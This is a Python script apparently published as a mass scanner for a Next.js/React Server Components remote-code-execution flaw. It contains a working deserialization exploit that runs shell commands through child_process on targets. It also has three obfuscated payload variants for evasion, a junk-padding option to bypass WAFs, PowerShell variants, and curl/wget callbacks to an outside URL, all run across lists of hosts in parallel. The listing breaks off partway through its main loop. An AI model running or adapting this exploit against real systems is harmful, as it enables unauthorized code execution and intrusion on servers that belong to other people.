#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
#     "tqdm>=4.64.0",
# ]
# ///

"""
React2Shell Scanner - High Fidelity Detection for RSC/Next.js RCE
CVE-2025-55182 & CVE-2025-66478

Based on research from Assetnote Security Research Team.

Vulnerability Details:
- CVE-2025-55182: React Server Components insecure deserialization (CVSS 10.0)
- CVE-2025-66478: Next.js Server Actions RCE (duplicate of CVE-2025-55182)

Affected Versions:
- React: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- Next.js: 14.3.0-canary.77 through 16.0.6

Patched Versions:
- React: 19.0.1, 19.1.2, 19.2.1
- Next.js: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7
"""

import argparse
import hashlib
import json
import os
import random
import re
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: 'tqdm' library required. Install with: pip install tqdm")
    sys.exit(1)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


# Vulnerable version ranges
VULNERABLE_REACT_VERSIONS = ["19.0.0", "19.1.0", "19.1.1", "19.2.0"]
VULNERABLE_NEXTJS_RANGES = [
    # (min_version, max_version) - inclusive
    ("14.3.0", "14.3.0-canary.87"),  # Canary builds before patch
    ("15.0.0", "15.0.4"),
    ("15.1.0", "15.1.8"),
    ("15.2.0", "15.2.5"),
    ("15.3.0", "15.3.5"),
    ("15.4.0", "15.4.7"),
    ("15.5.0", "15.5.6"),
    ("16.0.0", "16.0.6"),
]

PATCHED_NEXTJS_VERSIONS = [
    "15.0.5",
    "15.1.9",
    "15.2.6",
    "15.3.6",
    "15.4.8",
    "15.5.7",
    "16.0.7",
]
PATCHED_REACT_VERSIONS = ["19.0.1", "19.1.2", "19.2.1"]


@dataclass
class VersionInfo:
    """Stores detected version information."""

    nextjs_version: Optional[str] = None
    react_version: Optional[str] = None
    build_id: Optional[str] = None
    has_app_router: bool = False
    has_server_actions: bool = False
    potentially_vulnerable: bool = False
    version_source: str = ""


@dataclass
class ScanResult:
    """Comprehensive scan result."""

    host: str
    vulnerable: Optional[bool] = None
    status_code: Optional[int] = None
    error: Optional[str] = None
    request: Optional[str] = None
    response: Optional[str] = None
    final_url: Optional[str] = None
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat() + "Z"
    )
    version_info: Optional[VersionInfo] = None
    detection_method: str = "rce_poc"
    retry_count: int = 0
    response_time_ms: Optional[float] = None
    cve_ids: list = field(default_factory=lambda: ["CVE-2025-55182", "CVE-2025-66478"])
    cvss_score: float = 10.0

    def to_dict(self) -> dict:
        """Convert to dictionary for JSON serialization."""
        result = {
            "host": self.host,
            "vulnerable": self.vulnerable,
            "status_code": self.status_code,
            "error": self.error,
            "request": self.request,
            "response": self.response,
            "final_url": self.final_url,
            "timestamp": self.timestamp,
            "detection_method": self.detection_method,
            "retry_count": self.retry_count,
            "response_time_ms": self.response_time_ms,
            "cve_ids": self.cve_ids,
            "cvss_score": self.cvss_score,
        }
        if self.version_info:
            result["version_info"] = {
                "nextjs_version": self.version_info.nextjs_version,
                "react_version": self.version_info.react_version,
                "build_id": self.version_info.build_id,
                "has_app_router": self.version_info.has_app_router,
                "has_server_actions": self.version_info.has_server_actions,
                "potentially_vulnerable": self.version_info.potentially_vulnerable,
                "version_source": self.version_info.version_source,
            }
        return result


def colorize(text: str, color: str) -> str:
    """Apply color to text."""
    return f"{color}{text}{Colors.RESET}"


def print_banner():
    """Print the tool banner."""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}brought to you by assetnote{Colors.RESET}
"""
    print(banner)


def parse_headers(header_list: list[str] | None) -> dict[str, str]:
    """Parse a list of 'Key: Value' strings into a dict."""
    headers = {}
    if not header_list:
        return headers
    for header in header_list:
        if ": " in header:
            key, value = header.split(": ", 1)
            headers[key] = value
        elif ":" in header:
            key, value = header.split(":", 1)
            headers[key] = value.lstrip()
    return headers


def normalize_host(host: str) -> str:
    """Normalize host to include scheme if missing."""
    host = host.strip()
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = f"https://{host}"
    return host.rstrip("/")


def parse_version(version_str: str) -> tuple:
    """Parse a version string into comparable tuple."""
    # Handle canary versions like "14.3.0-canary.77"
    match = re.match(r"(\d+)\.(\d+)\.(\d+)(?:-canary\.(\d+))?", version_str)
    if match:
        major, minor, patch = (
            int(match.group(1)),
            int(match.group(2)),
            int(match.group(3)),
        )
        canary = int(match.group(4)) if match.group(4) else 9999  # Non-canary is higher
        return (major, minor, patch, canary)
    return (0, 0, 0, 0)


def is_version_vulnerable(version: str) -> bool:
    """Check if a Next.js version is in the vulnerable range."""
    if not version:
        return False

    # Check if it's a known patched version
    if version in PATCHED_NEXTJS_VERSIONS:
        return False

    parsed = parse_version(version)
    if parsed == (0, 0, 0, 0):
        return False

    for min_ver, max_ver in VULNERABLE_NEXTJS_RANGES:
        min_parsed = parse_version(min_ver)
        max_parsed = parse_version(max_ver)
        if min_parsed <= parsed <= max_parsed:
            return True

    return False


def fingerprint_nextjs(
    host: str, timeout: int, verify_ssl: bool, custom_headers: dict | None = None
) -> VersionInfo:
    """Fingerprint Next.js version and detect RSC/Server Actions indicators."""
    info = VersionInfo()
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if custom_headers:
        base_headers.update(custom_headers)

    try:
        # Check for /_next/static/ to confirm Next.js and get build ID
        response = requests.get(
            f"{host}/",
            headers=base_headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=True,
        )

        html = response.text

        # Extract build ID from __NEXT_DATA__ or asset paths
        build_match = re.search(r"/_next/static/([a-zA-Z0-9_-]+)/", html)
        if build_match:
            info.build_id = build_match.group(1)

        # Look for __NEXT_DATA__ script which contains version info
        next_data_match = re.search(
            r'<script id="__NEXT_DATA__"[^>]*>([^<]+)</script>', html
        )
        if next_data_match:
            try:
                next_data = json.loads(next_data_match.group(1))
                # Check for App Router indicators
                if next_data.get("appGip") or "rsc" in str(next_data).lower():
                    info.has_app_router = True
            except json.JSONDecodeError:
                pass

        # Check for RSC indicators in response headers
        if "x-nextjs-matched-path" in response.headers:
            info.has_app_router = True
        if "rsc" in response.headers.get("content-type", "").lower():
            info.has_app_router = True
            info.has_server_actions = True

        # Check for Server Actions indicators
        # RSC payload markers in HTML
        if "self.__next_f.push" in html or "$ACTION_" in html:
            info.has_server_actions = True
            info.has_app_router = True

        # Try to get version from error page or known endpoints
        try:
            error_resp = requests.get(
                f"{host}/_next/static/chunks/main.js",
                headers=base_headers,
                timeout=timeout // 2,
                verify=verify_ssl,
            )
            # Look for version strings in the main chunk
            ver_match = re.search(
                r'Next\.js\s*["\']?v?(\d+\.\d+\.\d+)', error_resp.text
            )
            if ver_match:
                info.nextjs_version = ver_match.group(1)
                info.version_source = "main.js"
        except RequestException:
            pass

        # Try x-powered-by header
        powered_by = response.headers.get("x-powered-by", "")
        if "Next.js" in powered_by:
            ver_match = re.search(r"Next\.js\s*(\d+\.\d+\.\d+)", powered_by)
            if ver_match:
                info.nextjs_version = ver_match.group(1)
                info.version_source = "x-powered-by"

        # Determine if potentially vulnerable
        if info.nextjs_version:
            info.potentially_vulnerable = is_version_vulnerable(info.nextjs_version)
        elif info.has_app_router or info.has_server_actions:
            # If we detect RSC/Server Actions but can't determine version, mark as potentially vulnerable
            info.potentially_vulnerable = True
            info.version_source = "rsc_detection"

    except RequestException:
        pass

    return info


def detect_rsc_endpoints(
    host: str, timeout: int, verify_ssl: bool, custom_headers: dict | None = None
) -> list[str]:
    """Detect potential RSC/Server Action endpoints."""
    endpoints = ["/"]
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if custom_headers:
        base_headers.update(custom_headers)

    try:
        response = requests.get(
            f"{host}/",
            headers=base_headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=True,
        )

        # Extract internal links that might be RSC endpoints
        links = re.findall(r'href="(/[^"]*)"', response.text)
        for link in links[:10]:  # Limit to first 10 links
            if not link.startswith("/_next") and link not in endpoints:
                endpoints.append(link)

    except RequestException:
        pass

    return endpoints


def generate_junk_data(size_bytes: int) -> tuple[str, str]:
    """Generate random junk data for WAF bypass."""
    param_name = "".join(random.choices(string.ascii_lowercase, k=12))
    junk = "".join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
    return param_name, junk


def build_safe_payload() -> tuple[str, str]:
    """Build the safe multipart form data payload for the vulnerability check (side-channel)."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_payload(
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    callback_url: str | None = None,
    payload_variant: int = 1,
) -> tuple[str, str]:
    """Build the RCE PoC multipart form data payload.

    Args:
        windows: Use Windows PowerShell payload
        waf_bypass: Add junk data to bypass WAF
        waf_bypass_size_kb: Size of junk data in KB
        callback_url: Optional URL for DNS/HTTP callback confirmation
        payload_variant: Payload variant (1-3) for evasion
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if callback_url:
        # Callback-based payload for blind RCE confirmation
        if windows:
            cmd = f'powershell -c \\"Invoke-WebRequest -Uri {callback_url}\\"'
        else:
            cmd = f"curl -s {callback_url} || wget -q -O- {callback_url}"
        expected_result = None  # No expected result, check callback server
    elif windows:
        # PowerShell payload - escape double quotes for JSON
        cmd = 'powershell -c \\"41*271\\"'
        expected_result = "11111"
    else:
        # Linux/Unix payload
        cmd = "echo $((41*271))"
        expected_result = "11111"

    # Different payload variants for evasion
    if payload_variant == 1:
        # Original payload structure
        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
            f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
    elif payload_variant == 2:
        # Alternative using global.process
        prefix_payload = (
            f"var c=global.process.mainModule.require('child_process');"
            f"var r=c.execSync('{cmd}').toString().trim();"
            f"throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest:'NEXT_REDIRECT;push;/login?a='+r+';307;'}});"
        )
    else:
        # Alternative using require directly with obfuscation
        prefix_payload = (
            f"var m='child_'+'process',r=require(m).execSync('{cmd}')"
            f".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest:`NEXT_REDIRECT;push;/login?a=${{r}};307;`}});"
        )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []

    # Add junk data at the start if WAF bypass is enabled
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def resolve_redirects(
    url: str, timeout: int, verify_ssl: bool, max_redirects: int = 10
) -> str:
    """Follow redirects only if they stay on the same host."""
    current_url = url
    original_host = urlparse(url).netloc

    for _ in range(max_redirects):
        try:
            response = requests.head(
                current_url, timeout=timeout, verify=verify_ssl, allow_redirects=False
            )
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get("Location")
                if location:
                    if location.startswith("/"):
                        # Relative redirect - same host, safe to follow
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    else:
                        # Absolute redirect - check if same host
                        new_host = urlparse(location).netloc
                        if new_host == original_host:
                            current_url = location
                        else:
                            break  # Different host, stop following
                else:
                    break
            else:
                break
        except RequestException:
            break
    return current_url


def send_payload(
    target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool
) -> tuple[requests.Response | None, str | None]:
    """Send the exploit payload to a URL. Returns (response, error)."""
    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=body,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
        )
        return response, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {str(e)}"
    except requests.exceptions.Timeout:
        return None, "Request timed out"
    except RequestException as e:
        return None, f"Request failed: {str(e)}"
    except Exception as e:
        return None, f"Unexpected error: {str(e)}"


def is_vulnerable_safe_check(response: requests.Response) -> bool:
    """Check if a response indicates vulnerability (safe side-channel check)."""
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False

    # Check for Vercel/Netlify mitigations (not valid findings)
    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = (
        has_netlify_vary or server_header == "netlify" or server_header == "vercel"
    )

    return not is_mitigated


def is_vulnerable_rce_check(response: requests.Response) -> bool:
    """Check if a response indicates vulnerability (RCE PoC check)."""
    # Check for the X-Action-Redirect header with the expected value
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r".*/login\?a=11111.*", redirect_header))


def check_vulnerability(
    host: str,
    timeout: int = 10,
    verify_ssl: bool = True,
    follow_redirects: bool = True,
    custom_headers: dict[str, str] | None = None,
    safe_check: bool = False,
    windows: bool = False,
    waf_bypass: bool = False,
    waf_bypass_size_kb: int = 128,
    callback_url: str | None = None,
    fingerprint: bool = True,
    retries: int = 2,
    retry_delay: float = 1.0,
    payload_variant: int = 1,
) -> ScanResult:
    """
    Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478.

    Tests root path first. If not vulnerable and redirects exist, tests redirect path.

    Args:
        host: Target host to scan
        timeout: Request timeout in seconds
        verify_ssl: Whether to verify SSL certificates
        follow_redirects: Follow same-host redirects
        custom_headers: Custom HTTP headers
        safe_check: Use safe side-channel detection
        windows: Use Windows PowerShell payload
        waf_bypass: Add junk data to bypass WAF
        waf_bypass_size_kb: Size of junk data
        callback_url: URL for callback-based blind RCE confirmation
        fingerprint: Perform version fingerprinting before exploit
        retries: Number of retry attempts on transient failures
        retry_delay: Delay between retries in seconds
        payload_variant: Payload variant for evasion (1-3)

    Returns:
        ScanResult with vulnerability status and metadata
    """
    result = ScanResult(host=host)
    result.detection_method = "safe_check" if safe_check else "rce_poc"

    original_host = host
    host = normalize_host(host)
    if not host:
        result.error = "Invalid or empty host"
        return result

    # Perform version fingerprinting if enabled
    if fingerprint:
        version_info = fingerprint_nextjs(host, timeout, verify_ssl, custom_headers)
        result.version_info = version_info

        # If we can determine version and it's patched, skip exploit check
        if version_info.nextjs_version and not version_info.potentially_vulnerable:
            result.vulnerable = False
            result.error = f"Version {version_info.nextjs_version} is patched"
            return result

    root_url = f"{host}/"

    if safe_check:
        body, content_type = build_safe_payload()
        is_vulnerable = is_vulnerable_safe_check
    else:
        body, content_type = build_rce_payload(
            windows=windows,
            waf_bypass=waf_bypass,
            waf_bypass_size_kb=waf_bypass_size_kb,
            callback_url=callback_url,
            payload_variant=payload_variant,
        )
        is_vulnerable = is_vulnerable_rce_check

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }

    # Apply custom headers (override defaults)
    if custom_headers:
        headers.update(custom_headers)

    def build_request_str(url: str) -> str:
        parsed = urlparse(url)
        path = parsed.path or "/"
        req_str = f"POST {path} HTTP/1.1\r\n"
        req_str += f"Host: {parsed.netloc}\r\n"
        for k, v in headers.items():
            req_str += f"{k}: {v}\r\n"
        req_str += f"Content-Length: {len(body)}\r\n\r\n"
        req_str += body
        return req_str

    def build_response_str(resp: requests.Response) -> str:
        resp_str = f"HTTP/1.1 {resp.status_code} {resp.reason}\r\n"
        for k, v in resp.headers.items():
            resp_str += f"{k}: {v}\r\n"
        resp_str += f"\r\n{resp.text[:2000]}"
        return resp_str

    def attempt_exploit(
        url: str, retry_count: int = 0
    ) -> tuple[requests.Response | None, str | None, int]:
        """Attempt exploit with retry logic."""
        last_error = None
        for attempt in range(retry_count + 1):
            start_time = time.time()
            response, error = send_payload(url, headers, body, timeout, verify_ssl)
            elapsed_ms = (time.time() - start_time) * 1000

            if response is not None:
                return response, None, attempt
            last_error = error

            # Only retry on transient errors
            if attempt < retry_count and any(
                x in str(error).lower() for x in ["timeout", "connection"]
            ):
                time.sleep(retry_delay)
            else:
                break

        return None, last_error, retry_count

    # First, test the root path
    result.final_url = root_url
    result.request = build_request_str(root_url)

    start_time = time.time()
    response, error, attempts = attempt_exploit(root_url, retries)
    result.response_time_ms = (time.time() - start_time) * 1000
    result.retry_count = attempts

    if error:
        result.error = error
        return result

    result.status_code = response.status_code
    result.response = build_response_str(response)

    if is_vulnerable(response):
        result.vulnerable = True
        return result

    # Root not vulnerable - try redirect path if enabled
    if follow_redirects:
        try:
            redirect_url = resolve_redirects(root_url, timeout, verify_ssl)
            if redirect_url != root_url:
                # Different path, test it
                response, error, attempts = attempt_exploit(redirect_url, retries)
                result.retry_count = max(result.retry_count, attempts)

                if error:
                    # Keep root result but note the redirect failed
                    result.vulnerable = False
                    return result

                result.final_url = redirect_url
                result.request = build_request_str(redirect_url)
                result.status_code = response.status_code
                result.response = build_response_str(response)

                if is_vulnerable(response):
                    result.vulnerable = True
                    return result
        except Exception:
            pass  # Continue with root result if redirect resolution fails

    result.vulnerable = False
    return result


def load_hosts(hosts_file: str) -> list[str]:
    """Load hosts from a file, one per line."""
    hosts = []
    try:
        with open(hosts_file, "r") as f:
            for line in f:
                host = line.strip()
                if host and not host.startswith("#"):
                    hosts.append(host)
    except FileNotFoundError:
        print(colorize(f"[ERROR] File not found: {hosts_file}", Colors.RED))
        sys.exit(1)
    except Exception as e:
        print(colorize(f"[ERROR] Failed to read file: {e}", Colors.RED))
        sys.exit(1)
    return hosts


def save_results(
    results: list[ScanResult], output_file: str, vulnerable_only: bool = True
):
    """Save scan results to JSON file."""
    result_dicts = [r.to_dict() if isinstance(r, ScanResult) else r for r in results]

    if vulnerable_only:
        result_dicts = [r for r in result_dicts if r.get("vulnerable") is True]

    output = {
        "scan_time": datetime.now(timezone.utc).isoformat() + "Z",
        "scanner_version": "2.0.0",
        "cve_ids": ["CVE-2025-55182", "CVE-2025-66478"],
        "total_results": len(result_dicts),
        "vulnerable_count": sum(1 for r in result_dicts if r.get("vulnerable") is True),
        "results": result_dicts,
    }

    try:
        with open(output_file, "w") as f:
            json.dump(output, f, indent=2)
        print(colorize(f"\n[+] Results saved to: {output_file}", Colors.GREEN))
    except Exception as e:
        print(colorize(f"\n[ERROR] Failed to save results: {e}", Colors.RED))


def print_result(
    result: ScanResult | dict, verbose: bool = False, show_version: bool = True
):
    """Print scan result to console."""
    if isinstance(result, ScanResult):
        host = result.host
        final_url = result.final_url
        vulnerable = result.vulnerable
        status_code = result.status_code
        error = result.error
        response = result.response
        version_info = result.version_info
    else:
        host = result["host"]
        final_url = result.get("final_url")
        vulnerable = result["vulnerable"]
        status_code = result["status_code"]
        error = result.get("error")
        response = result.get("response")
        version_info = result.get("version_info")

    redirected = final_url and final_url != f"{normalize_host(host)}/"

    if vulnerable is True:
        status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
        cve_info = colorize("CVE-2025-55182", Colors.YELLOW)
        print(
            f"{status} {colorize(host, Colors.WHITE)} - Status: {status_code} ({cve_info})"
        )
        if redirected:
            print(f"  -> Redirected to: {final_url}")
        if show_version and version_info:
            vi = (
                version_info
                if isinstance(version_info, VersionInfo)
                else VersionInfo(**version_info)
            )
            if vi.nextjs_version:
                print(f"  -> Next.js version: {vi.nextjs_version}")
            if vi.has_server_actions:
                print(f"  -> Server Actions detected")
    elif vulnerable is False:
        status = colorize("[NOT VULNERABLE]", Colors.GREEN)
        status_str = f"Status: {status_code}" if status_code else ""
        print(f"{status} {host} {status_str}".strip())
        if show_version and version_info:
            vi = (
                version_info
                if isinstance(version_info, VersionInfo)
                else VersionInfo(**version_info)
            )
            if vi.nextjs_version:
                ver_color = (
                    Colors.GREEN if not vi.potentially_vulnerable else Colors.YELLOW
                )
                print(f"  -> Next.js version: {colorize(vi.nextjs_version, ver_color)}")
        if redirected and verbose:
            print(f"  -> Redirected to: {final_url}")
    else:
        status = colorize("[ERROR]", Colors.YELLOW)
        error_msg = error or "Unknown error"
        print(f"{status} {host} - {error_msg}")

    if verbose and vulnerable:
        print(colorize("  Response snippet:", Colors.CYAN))
        if response:
            lines = response.split("\r\n")[:10]
            for line in lines:
                print(f"    {line}")


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell Scanner v2.0 - CVE-2025-55182 & CVE-2025-66478 Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -l hosts.txt -t 20 -o results.json
  %(prog)s -l hosts.txt --threads 50 --timeout 15
  %(prog)s -u https://example.com -H "Authorization: Bearer token"
  %(prog)s -u https://example.com --safe-check
  %(prog)s -u https://example.com --callback-url https://your-server.com/callback
  %(prog)s -u https://example.com --fingerprint-only
  %(prog)s -u https://example.com --payload-variant 2 --waf-bypass

CVE Information:
  CVE-2025-55182: React Server Components insecure deserialization (CVSS 10.0)
  CVE-2025-66478: Next.js Server Actions RCE (duplicate of CVE-2025-55182)

Affected Versions:
  React: 19.0.0, 19.1.0, 19.1.1, 19.2.0
  Next.js: 14.3.0-canary.77 through 16.0.6
        """,
    )

    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("-u", "--url", help="Single URL/host to check")
    input_group.add_argument(
        "-l", "--list", help="File containing list of hosts (one per line)"
    )

    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)",
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)",
    )

    parser.add_argument("-o", "--output", help="Output file for results (JSON format)")

    parser.add_argument(
        "--all-results",
        action="store_true",
        help="Save all results to output file, not just vulnerable hosts",
    )

    parser.add_argument(
        "-k",
        "--insecure",
        default=True,
        action="store_true",
        help="Disable SSL certificate verification",
    )

    parser.add_argument(
        "-H",
        "--header",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Custom header in 'Key: Value' format (can be used multiple times)",
    )

    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Verbose output (show response snippets for vulnerable hosts)",
    )

    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Quiet mode (only show vulnerable hosts)",
    )

    parser.add_argument(
        "--no-color", action="store_true", help="Disable colored output"
    )

    parser.add_argument(
        "--safe-check",
        action="store_true",
        help="Use safe side-channel detection instead of RCE PoC",
    )

    parser.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payload instead of Unix shell",
    )

    parser.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Add junk data to bypass WAF content inspection (default: 128KB)",
    )

    parser.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data in KB for WAF bypass (default: 128)",
    )

    parser.add_argument(
        "--callback-url",
        metavar="URL",
        help="URL for callback-based blind RCE confirmation (e.g., Burp Collaborator)",
    )

    parser.add_argument(
        "--fingerprint-only",
        action="store_true",
        help="Only perform version fingerprinting, no exploit check",
    )

    parser.add_argument(
        "--no-fingerprint",
        action="store_true",
        help="Skip version fingerprinting before exploit check",
    )

    parser.add_argument(
        "--retries",
        type=int,
        default=2,
        help="Number of retry attempts on transient failures (default: 2)",
    )

    parser.add_argument(
        "--retry-delay",
        type=float,
        default=1.0,
        help="Delay between retries in seconds (default: 1.0)",
    )

    parser.add_argument(
        "--payload-variant",
        type=int,
        choices=[1, 2, 3],
        default=1,
        help="Payload variant for evasion (1-3, default: 1)",
    )

    args = parser.parse_args()

    if args.no_color or not sys.stdout.isatty():
        Colors.RED = ""
        Colors.GREEN = ""
        Colors.YELLOW = ""
        Colors.BLUE = ""
        Colors.MAGENTA = ""
        Colors.CYAN = ""
        Colors.WHITE = ""
        Colors.BOLD = ""
        Colors.RESET = ""

    if not args.quiet:
        print_banner()

    if args.url:
        hosts = [args.url]
    else:
        hosts = load_hosts(args.list)

    if not hosts:
        print(colorize("[ERROR] No hosts to scan", Colors.RED))
        sys.exit(1)

    # Adjust timeout for WAF bypass mode
    timeout = args.timeout
    if args.waf_bypass and args.timeout == 10:
        timeout = 20

    if not args.quiet:
        print(colorize(f"[*] Loaded {len(hosts)} host(s) to scan", Colors.CYAN))
        print(colorize(f"[*] Using {args.threads} thread(s)", Colors.CYAN))
        print(colorize(f"[*] Timeout: {timeout}s", Colors.CYAN))
        if args.fingerprint_only:
            print(colorize("[*] Fingerprint-only mode (no exploit check)", Colors.CYAN))
        elif args.safe_check:
            print(colorize("[*] Using safe side-channel check", Colors.CYAN))
        else:
            print(colorize("[*] Using RCE PoC check", Colors.CYAN))
            if args.payload_variant != 1:
                print(
                    colorize(
                        f"[*] Using payload variant {args.payload_variant}", Colors.CYAN
                    )
                )
        if args.windows:
            print(
                colorize("[*] Windows mode enabled (PowerShell payload)", Colors.CYAN)
            )
        if args.waf_bypass:
            print(
                colorize(
                    f"[*] WAF bypass enabled ({args.waf_bypass_size}KB junk data)",
                    Colors.CYAN,
                )
            )
        if args.callback_url:
            print(colorize(f"[*] Callback URL: {args.callback_url}", Colors.CYAN))
        if not args.no_fingerprint and not args.fingerprint_only:
            print(colorize("[*] Version fingerprinting enabled", Colors.CYAN))
        if args.insecure:
            print(colorize("[!] SSL verification disabled", Colors.YELLOW))
        print()

    results = []
    vulnerable_count = 0
    error_count = 0
    potentially_vulnerable_count = 0

    verify_ssl = not args.insecure
    custom_headers = parse_headers(args.headers)

    if args.insecure:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def scan_host(host: str) -> ScanResult:
        """Scan a single host with all configured options."""
        if args.fingerprint_only:
            # Only fingerprint, no exploit
            normalized = normalize_host(host)
            version_info = fingerprint_nextjs(
                normalized, timeout, verify_ssl, custom_headers
            )
            result = ScanResult(host=host)
            result.version_info = version_info
            result.detection_method = "fingerprint_only"
            if version_info.potentially_vulnerable:
                result.vulnerable = None  # Unknown - no exploit check
                result.error = "Potentially vulnerable (fingerprint only)"
            else:
                result.vulnerable = False
            return result

        return check_vulnerability(
            host,
            timeout,
            verify_ssl,
            custom_headers=custom_headers,
            safe_check=args.safe_check,
            windows=args.windows,
            waf_bypass=args.waf_bypass,
            waf_bypass_size_kb=args.waf_bypass_size,
            callback_url=args.callback_url,
            fingerprint=not args.no_fingerprint,
            retries=args.retries,
            retry_delay=args.retry_delay,
            payload_variant=args.payload_variant,
        )

    def get_vulnerable(result: ScanResult) -> bool:
        return (
            result.vulnerable
            if isinstance(result, ScanResult)
            else result.get("vulnerable")
        )

    def get_error(result: ScanResult) -> str | None:
        return result.error if isinstance(result, ScanResult) else result.get("error")

    def is_potentially_vulnerable(result: ScanResult) -> bool:
        if isinstance(result, ScanResult) and result.version_info:
            return result.version_info.potentially_vulnerable
        return False

    if len(hosts) == 1:
        result = scan_host(hosts[0])
        results.append(result)
        if not args.quiet or get_vulnerable(result):
            print_result(result, args.verbose)
        if get_vulnerable(result):
            vulnerable_count = 1
        if is_potentially_vulnerable(result):
            potentially_vulnerable_count = 1
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan_host, host): host for host in hosts}

            with tqdm(
                total=len(hosts),
                desc=colorize("Scanning", Colors.CYAN),
                unit="host",
                ncols=80,
                disable=args.quiet,
            ) as pbar:
                for future in as_completed(futures):
                    result = future.result()
                    results.append(result)

                    if get_vulnerable(result):
                        vulnerable_count += 1
                        tqdm.write("")
